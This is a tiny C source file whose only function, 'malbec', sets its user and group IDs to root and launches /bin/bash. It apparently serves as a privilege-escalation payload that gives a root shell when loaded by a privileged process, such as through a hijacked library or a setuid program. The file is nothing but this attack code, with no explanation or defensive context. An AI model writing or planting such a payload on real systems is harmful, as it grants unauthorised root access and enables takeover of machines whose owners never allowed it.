#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
void malbec() {
setuid(0); setgid(0); system("/bin/bash");
}
